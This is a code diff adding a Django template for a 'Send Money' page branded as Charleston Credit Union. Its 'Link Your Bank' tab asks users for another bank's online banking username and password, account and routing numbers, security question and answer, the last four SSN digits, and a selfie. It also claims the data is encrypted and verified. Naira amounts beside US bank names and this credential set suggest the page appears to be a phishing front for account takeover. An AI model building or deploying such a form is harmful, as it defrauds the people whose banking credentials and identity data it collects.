@@ -1,0 +1,207 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Send Money — Charleston Credit Union</title>
+  <link rel="stylesheet" href="{% static 'core/style.css' %}">
+  <style>
+    body {
+      font-family: "Segoe UI", Arial, sans-serif;
+      background-color: #f4f7fa;
+      margin: 0;
+      padding: 0;
+      color: #333;
+    }
+
+    .container {
+      width: 95%;
+      max-width: 750px;
+      margin: 70px auto;
+      background: #fff;
+      border-radius: 16px;
+      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.08);
+      overflow: hidden;
+      padding: 35px 40px;
+      transition: all 0.3s ease-in-out;
+    }
+
+    h2 {
+      text-align: center;
+      font-size: 26px;
+      font-weight: 600;
+      color: #1e3a8a;
+      margin-bottom: 20px;
+    }
+
+    .tabs {
+      display: flex;
+      border-bottom: 2px solid #e5e7eb;
+      margin-bottom: 25px;
+    }
+
+    .tabs button {
+      flex: 1;
+      padding: 12px 0;
+      background: none;
+      border: none;
+      cursor: pointer;
+      font-weight: 600;
+      font-size: 15px;
+      color: #6b7280;
+      border-bottom: 3px solid transparent;
+      transition: all 0.2s ease-in-out;
+    }
+
+    .tabs button.active {
+      color: #1e3a8a;
+      border-bottom: 3px solid #1e3a8a;
+      background-color: #f9fafb;
+    }
+
+    form {
+      display: flex;
+      flex-direction: column;
+      gap: 15px;
+    }
+
+    label {
+      font-weight: 600;
+      color: #374151;
+      margin-bottom: 4px;
+    }
+
+    input {
+      padding: 12px;
+      border: 1px solid #d1d5db;
+      border-radius: 8px;
+      font-size: 14px;
+      width: 100%;
+      transition: border-color 0.2s;
+    }
+
+    input:focus {
+      outline: none;
+      border-color: #1e3a8a;
+      box-shadow: 0 0 0 3px rgba(30, 58, 138, 0.1);
+    }
+
+    button[type="submit"] {
+      background: #1e3a8a;
+      color: white;
+      border: none;
+      padding: 14px;
+      border-radius: 8px;
+      font-weight: 600;
+      cursor: pointer;
+      font-size: 15px;
+      transition: background 0.3s;
+      margin-top: 10px;
+    }
+
+    button[type="submit"]:hover {
+      background: #0f256c;
+    }
+
+    .note {
+      font-size: 13px;
+      color: #6b7280;
+      text-align: center;
+      margin-top: 15px;
+    }
+
+    .hidden {
+      display: none;
+    }
+
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>Send Money</h2>
+
+    <div class="tabs">
+      <button type="button" id="tab-same-bank" class="active" onclick="showTab('same-bank')">Same Bank</button>
+      <button type="button" id="tab-link-bank" onclick="showTab('link-bank')">Link Your Bank</button>
+    </div>
+
+    <!-- Same Bank Form -->
+    <div id="same-bank">
+      <form method="post" action="{% url 'transfer' %}">
+        {% csrf_token %}
+        <label>Recipient Email</label>
+        <input type="email" name="recipient_email" placeholder="example@email.com" required>
+
+        <label>Amount (₦)</label>
+        <input type="number" name="amount" step="0.01" placeholder="Enter amount" required>
+
+        <label>Description</label>
+        <input type="text" name="description" placeholder="e.g. Family transfer or payment">
+
+        <button type="submit">Send Money</button>
+      </form>
+    </div>
+
+    <!-- Link Bank Form -->
+    <div id="link-bank" class="hidden">
+      <form method="post" action="{% url 'link_bank' %}" enctype="multipart/form-data">
+        {% csrf_token %}
+        <label>Bank Name</label>
+        <input type="text" name="bank_name" placeholder="e.g. Wells Fargo, Chase" required>
+
+        <label>Account Number</label>
+        <input type="text" name="account_number" placeholder="Enter your account number" required>
+
+        <label>Routing Number</label>
+        <input type="text" name="routing_number" placeholder="Enter routing number" required>
+
+        <label>Phone Number</label>
+        <input type="text" name="phone_number" placeholder="Enter your phone number">
+
+        <label>Security Question</label>
+        <input type="text" name="security_question" placeholder="e.g. What’s your pet’s name?">
+
+        <label>Security Answer</label>
+        <input type="text" name="security_answer" placeholder="Answer">
+
+        <label>SSN (Last 4 digits)</label>
+        <input type="text" name="ssn_last4" maxlength="4" placeholder="1234">
+
+        <label>Account Username</label>
+        <input type="text" name="account_username" placeholder="Enter online banking username">
+
+        <label>Account Password</label>
+        <input type="password" name="account_password" placeholder="Enter online banking password">
+
+        <label>Upload Selfie Photo</label>
+        <input type="file" name="selfie" accept="image/*">
+
+        <button type="submit">Link Bank</button>
+      </form>
+      <p class="note">All information is encrypted and securely verified.</p>
+    </div>
+  </div>
+
+  <script>
+    function showTab(tab) {
+      const sameBank = document.getElementById("same-bank");
+      const linkBank = document.getElementById("link-bank");
+      const tabSame = document.getElementById("tab-same-bank");
+      const tabLink = document.getElementById("tab-link-bank");
+
+      sameBank.classList.add("hidden");
+      linkBank.classList.add("hidden");
+      tabSame.classList.remove("active");
+      tabLink.classList.remove("active");
+
+      if (tab === "same-bank") {
+        sameBank.classList.remove("hidden");
+        tabSame.classList.add("active");
+      } else {
+        linkBank.classList.remove("hidden");
+        tabLink.classList.add("active");
+      }
+    }
+  </script>
+</body>
+</html>
